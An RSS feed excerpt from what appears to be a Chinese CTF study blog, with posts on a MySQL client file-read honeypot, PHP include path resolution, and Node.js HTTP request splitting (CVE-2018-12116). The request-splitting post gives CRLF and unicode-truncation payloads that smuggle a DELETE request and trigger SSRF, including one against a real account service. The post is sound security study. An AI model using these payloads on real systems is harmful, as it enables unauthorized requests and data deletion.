&lt;p>参考：&lt;a href="https://www.zhaoj.in/read-6859.html#WEB3_easytp">wp1&lt;/a> | &lt;a href="http://www.yang99.top/index.php/archives/48/#easytp">wp2&lt;/a>&lt;/p>
&lt;h2 id="ddctf-2019mysql弱口令">[DDCTF 2019]MySQL弱口令&lt;/h2>
&lt;p>没找到环境，看wp云一下&lt;/p>
&lt;p>部署好agent.py之后用bettercap，读/root/.mysql_history拿flag一波带走&lt;/p>
&lt;p>参考：&lt;a href="https://yelo.cc/2019/04/18/ddctf-2019-writeups-web-7.html">wp&lt;/a>&lt;/p>
&lt;h2 id="一个中等好的蜜罐">一个中等好的蜜罐&lt;/h2>
&lt;p>之所以说中等好，是因为它受制于对应数据库的版本和配置情况，所以并不够通用，可以参考以下两个栗子：&lt;/p>
&lt;p>参考：&lt;a href="https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg">MySQL蜜罐获取攻击者微信ID&lt;/a> | &lt;a href="https://mp.weixin.qq.com/s/rQ9BpavBeMnS6xUOidZ5OA">溯源反制之MySQL蜜罐研究&lt;/a>&lt;/p>
&lt;hr>
&lt;p>唔，是7月做题的时候碰到的点，今天做题又碰到了，于是拿出来鞭个尸，比之前的理解要深刻一些了&lt;/p>
&lt;p>最近在看js原型污染的相关问题，结果考了个四级之后之前写的代码都不认得了😅小丑竟是我自己&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;ul>
&lt;li>&lt;a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/">MySQL connect file read&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://lightless.me/archives/read-mysql-client-file.html">Read MySQL Client&amp;rsquo;s File&lt;/a> | &lt;a href="https://xz.aliyun.com/t/3277">从MySQL出发的反击之路&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.anquanke.com/post/id/106488">如何利用MySQL LOCAL INFILE读取客户端文件&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg">MySQL蜜罐获取攻击者微信ID&lt;/a> | &lt;a href="https://mp.weixin.qq.com/s/rQ9BpavBeMnS6xUOidZ5OA">溯源反制之MySQL蜜罐研究&lt;/a>&lt;/li>
&lt;/ul>
&lt;/details></description></item><item><title>关于include/require(_once)的易混淆点</title><link>https://amiaaaz.github.io/2021/12/13/smth-about-include-require-in-php/</link><pubDate>Mon, 13 Dec 2021 01:12:22 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/13/smth-about-include-require-in-php/</guid><description>&lt;p>之前做题遇到后查了一下相关文章，觉得很适合出题，但是感觉不能为了考而考，也就失去了CTF的意义，所以还不如先发出来这一篇&lt;/p>
&lt;p>&lt;del>（别骂了 就是懒&lt;/del>&lt;/p>
&lt;h2 id="关于includerequire_once">关于&lt;code>include/require(_once)()&lt;/code>&lt;/h2>
&lt;p>这几个函数应该都不陌生（还应该再加上include_path），干的是文件包含的事；先按照给定参数寻找路径（当定义了路径则会完全忽略include_path），如果只有文件名则按照include_path的指定目录寻找，如果还没找到则会在调用脚本文件所在的目录和当前工作目录下寻找；下面说几个小点&lt;/p>
&lt;p>首先是require和include的区别在于require在出错时会产生E_COMPILE_ERROR级别的错误，脚本将中止运行，而include只会产生警告E_WARNING，不影响继续顶着错误继续执行脚本（做题很常见这个 无数的报错下面有正常的回显）&lt;/p>
&lt;p>另一个区别在于require是无条件包含函数，即程序执行前就会将文件内容以文本替换的形式引入（所以这份文件只被处理一次），让它变为php脚本的一部分（所以通常放在php文件的最前面）；include则是有条件包含函数，用到时才被加载，且每次执行文件时都要进行读取和评估&lt;/p>
&lt;p>当php遇到require/include(_once)函数时，如果给定的参数是个绝对路径则直接引入，但如果给的是相对路径，则要进入另外的逻辑（经过多次调用，宏展开后进入_php_stream_fopen_with_path）寻找此文件；在_php_stream_fopen_with_path会根据include_path和当前执行文件的path组成一个待选的目录列表，然后从列表头部开始根据DEFAULT_DIR_SEPARATOR（linux下默认为&lt;code>:&lt;/code> win为&lt;code>;&lt;/code>）取出路径，然后拼上文件名，如果成功则返回，失败则继续下一个待选择路径（&lt;u>所以如果有重名的就好玩了&lt;/u>）&lt;/p>
&lt;h2 id="几个好玩的小栗子">几个好玩的小栗子&lt;/h2>
&lt;p>这里举一个小栗子，文件结构和内容如下（注意这里include_path的写法!!!不仅有path_to_subdir还有&lt;code>:&lt;/code>分隔符前面代表的current_dir!!!）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024095717109.png" alt="image-20211024095717109">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024095830345.png" alt="image-20211024095830345">&lt;/p>
&lt;p>在不同的情况下运行看看效果&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024100007587.png" alt="image-20211024100007587">&lt;/p>
&lt;p>在root目录下执行时，直接根据1.php的include_path寻找2.php，而2.php中并没有设置include_path，那么路径就变成了列表中第一个待选择路径 即&lt;code>&amp;quot;.&amp;quot;&lt;/code>，而当前工作目录是root，所以就是/root/3.php的输出&lt;/p>
&lt;p>换到subdir目录下执行1.php时，列表中第一个待选择路径&lt;code>&amp;quot;.&amp;quot;&lt;/code>变为了subdir，自然输出变为了/root/subdir/3.php的输出&lt;/p>
&lt;p>现在我们把include_path仅保留path_to_subdir，继续上面的指令运行一下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024190934131.png" alt="image-20211024190934131">&lt;/p>
&lt;p>那不管当前路径是什么都会得到subdir的输出&lt;/p>
&lt;p>再进一步，在2.php中半道清空include_path会怎么样呢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024191919122.png" alt="image-20211024191919122">&lt;/p>
&lt;p>我们发现跟上面结果一样，但是这里的逻辑却有差异：2.php中清空include_path后再包含文件将会自动变为current_path的路径，而2.php在/root/subdir下，所以回显和2.php的路径保持一致&lt;/p>
&lt;p>再再进一步&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024192931075.png" alt="image-20211024192931075">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024193020147.png" alt="image-20211024193020147">&lt;/p>
&lt;p>诶，可以看到由于这里两次都用到了相对目录的&lt;code>&amp;quot;./&amp;quot;&lt;/code>进行引用，所以在/root目录下运行很顺畅，而/root/subdir目录下由于不会再存在./subdir/2.php，所以报错退出&lt;/p>
&lt;h2 id="使用注意">使用注意&lt;/h2>
&lt;ul>
&lt;li>在使用include_path和相对路径时会影响性能，所以最好用绝对路径&lt;/li>
&lt;li>目录相对路径的basedir永远是当前工作路径&lt;/li>
&lt;li>可以通过&lt;code>__DIR__&lt;/code>来获得绝对路径&lt;/li>
&lt;li>建议少使用&lt;code>include/require_once&lt;/code>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>*写的不全面，还有一部分需要补充 先鸽了，遇到题或者具体的应用场景我补充上来&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://www.laruence.com/2010/05/04/1450.html">深入理解PHP之require/include顺序&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>HTTP请求切分攻击学习笔记</title><link>https://amiaaaz.github.io/2021/12/07/http-request-splitting-attack-study-notes/</link><pubDate>Tue, 07 Dec 2021 02:24:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/07/http-request-splitting-attack-study-notes/</guid><description>&lt;p>说到与HTTP请求有关的攻击方式能想到什么？&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205111212810.png" alt="image-20211205111212810">&lt;/p>
&lt;p>&lt;del>是不是一下子恍然大明白了&lt;/del>&lt;/p>
&lt;p>这一篇就是其中HTTP Request Splitting的学习笔记，长期更新；其它模块的也会随后更新~&lt;/p>
&lt;p>老规矩，所有的参考链接&amp;amp;docker链接放到文末&lt;/p>
&lt;h2 id="nodejs-http请求路径中的unicode字符损坏">Node.js: http请求路径中的unicode字符损坏&lt;/h2>
&lt;blockquote>
&lt;p>使用Node.js向特定路径发出http请求，但是却被定向到了不一样的路径&lt;/p>
&lt;/blockquote>
&lt;p>虽然用户发出的http请求通常是个字符串string，但Node.js最终必须将请求以原始字节raw bytes输出，js支持unicode，这其中涉及到了unicode编码转换。对于不包含body的请求，Node.js默认使用&lt;code>latin1&lt;/code>，它是单字节编码，不能表示高编号的unicode字符，比如emoji 🐶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">v&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/caf\u{E9}\u{01F436}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">v&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">v&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205103409976.png" alt="image-20211205103409976">&lt;/p>
&lt;p>两字节的unicode编码用&lt;code>latin1&lt;/code>转换为单字节时会被截去开头的第一个字节&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{5b}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{015b}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{0128}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{28}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205103625305.png" alt="image-20211205103625305">&lt;/p>
&lt;hr>
&lt;p>那这个Node.js的安全问题跟SSRF又是怎么联系到一起的呢？处理用户输入时出现了数据损坏是个明显的危险信号&lt;/p>
&lt;h2 id="http-request-splitting">HTTP Request Splitting&lt;/h2>
&lt;blockquote>
&lt;p>&lt;em>This entails the adversary injecting malicious user input into various standard and/or user defined HTTP headers within a HTTP Request through user input of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters and unique character encoding. This malicious user input allows for web script to be injected in HTTP headers as well as into browser cookies or Ajax web/browser object parameters like XMLHttpRequest during implementation of asynchronous requests.&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>通俗来说，就是原本1个请求对应1次响应，现在我们对请求的body部分再添加1个请求，导致看似发送了1次请求实则会被解释为2个响应被加载出来，会造成XSS和SSRF&lt;/p>
&lt;p>举一个简单的小栗子：一般的请求形式是这样的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">GET&lt;/span> &lt;span style="color:#111">/private-api?q=&amp;lt;user-input-here&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但是我们构造了这样的用户输入&lt;/p>
&lt;pre tabindex="0">&lt;code>x HTTP/1.1\r\n\r\nDELETE /private-api HTTP/1.1\r\n
&lt;/code>&lt;/pre>&lt;p>当请求发出后，服务端将会收到这样的请求&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">GET&lt;/span> &lt;span style="color:#111">/private-api?q=x&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELETE /private-api HTTP/1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>包含了两个请求方式，如果服务端没有设置特殊的过滤则可能会将两个请求全部执行并回显；而如果第二个额外的请求包含一些只有服务端本地才能访问到的内容，则会造成SSRF(Server-Side Request Forgery)&lt;/p>
&lt;h2 id="ssrf-via-request-splitting--cve-2018-12116">SSRF via Request Splitting / cve-2018-12116&lt;/h2>
&lt;p>正如上面栗子展示的那样，不过一般http库都会对这种行为做出防范；Node.js也不例外，比如&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://gqa6995cu69dkt0oxvzzzwzt0k6auz.burpcollaborator.net/\r\n/test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205160107403.png" alt="image-20211205160107403">&lt;/p>
&lt;p>换成unicode呢？画风开始奇怪了&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;http://example.com/\u{010D}\u{010A}/test&amp;#39;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205160205490.png" alt="image-20211205160205490">&lt;/p>
&lt;p>上面我们提过的unicode截去开头第一个字节的事情，我们就可以构造&lt;code>\r\n&lt;/code>了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://example.com/\u{010D}\u{010A}/test&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205164009244.png" alt="image-20211205164009244">&lt;/p>
&lt;p>当Node.js&amp;lt;=8构造对这样的url请求时，由于他们不是HTTP控制字符所以不会修改，原样输出；而结合上面我们提过的unicode截去开头第一个字节的事情，我们就可以构造&lt;code>\r\n&lt;/code>的CRLFi了&lt;/p>
&lt;p>现在的Node.js均已修复此问题，官方修复-&amp;gt;&lt;a href="https://github.com/nodejs/node/commit/dd20c0186f">http: add &amp;ndash;security-revert for CVE-2018-12116&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205163601837.png" alt="image-20211205163601837">&lt;/p>
&lt;p>旧版中会直接对解释不了的unicode报错，而不是尝试原封不动的搬过去请求&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205163703908.png" alt="image-20211205163703908">&lt;/p>
&lt;h3 id="真实场景下的案例">真实场景下的案例&lt;/h3>
&lt;p>来自-&amp;gt;&lt;a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">Security Bugs in Practice: SSRF via Request Splitting&lt;/a> 强烈建议看原文&lt;/p>
&lt;p>火狐邮箱账号的客户端与服务器后端交互流程是这样的&lt;/p>
&lt;pre tabindex="0">&lt;code> +--------+ +--------+ +-----------+ +----------+
| Client | HTTP | API | HTTP | DataStore | SQL | MySQL |
| |&amp;lt;------&amp;gt;| Server |&amp;lt;------&amp;gt;| Service |&amp;lt;-----&amp;gt;| Database |
+--------+ +--------+ +-----------+ +----------+
&lt;/code>&lt;/pre>&lt;p>客户端发出的请求是通过http与API Server交互的，比如一个这样的请求&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">GET /email/74657374406578616d706c652e636f6d
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>会得到&lt;code>test@example.com&lt;/code>的邮件记录，用hex做了请求的路由，但是一个删除操作却是直接拼接字符串&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">DELETE /account/xyz/emails/test@example.com
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时，最后的端点可控，结合上面的bug，当我们注册这样一个账号&lt;/p>
&lt;pre tabindex="0">&lt;code>x@̠ňƆƆɐį1̮1č̊č̊ɆͅƆ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňƆƆɐį1̮1č̊č̊.cc
&lt;/code>&lt;/pre>&lt;p>它其实是这样&lt;/p>
&lt;pre tabindex="0">&lt;code>v = &amp;#39;x@̠ňƆƆɐį1̮1č̊č̊ɆͅƆ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňƆƆɐį1̮1č̊č̊.cc&amp;#39;
Buffer.from(v.toLowerCase(), &amp;#34;latin1&amp;#34;).toString()
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205205928287.png" alt="image-20211205205928287">&lt;/p>
&lt;p>&lt;del>真是Node.js的美妙特性&lt;/del>&lt;/p>
&lt;p>对这样一个账号再次进行DELETE请求时则会这样&lt;/p>
&lt;pre tabindex="0">&lt;code>console.log(Buffer.from(&amp;#39;DELETE /account/f9f9eebb05ef4b819b0467cc5ddd3b4a/email/x@̠ňɔɔɐį1̮1č̊č̊ɇͅɔ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňɔɔɐį1̮1č̊č̊.cc&amp;#39;, &amp;#39;latin1&amp;#39;).toString())
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205210133004.png" alt="image-20211205210133004">&lt;/p>
&lt;p>SSRF来了&lt;/p>
&lt;h2 id="asisctf-final-2018proxy-proxy">[ASISCTF final 2018]Proxy-Proxy&lt;/h2>
&lt;p>简单审了一下代码，标记到注释中了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">body_parser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;body-parser&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;md5&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ip&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;x-date&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">body_parser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">urlencoded&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">extended&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}));&lt;/span>
